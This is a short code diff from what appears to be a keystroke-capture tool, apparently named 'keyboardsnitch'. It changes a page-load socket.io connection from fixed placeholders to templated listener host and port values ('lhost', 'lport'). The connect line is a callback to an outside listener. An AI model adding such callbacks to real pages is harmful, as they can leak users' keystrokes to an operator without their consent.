@@ -188,7 +188,7 @@ window.onload = function() {
 	all_jskdetails = storage['all_jskdetails']
 
     namespace = '/test';
-    socket = io.connect('http://' + "KEYBOARDSNITCH_IP" + ':' + 'KEYBOARDSNITCH_PORT' + namespace);
+    socket = io.connect('http://' + '{{ lhost }}' + ':' + '{{ lport }}' + namespace);
 
     // event handler for new connections
     socket.on('connect', function() {
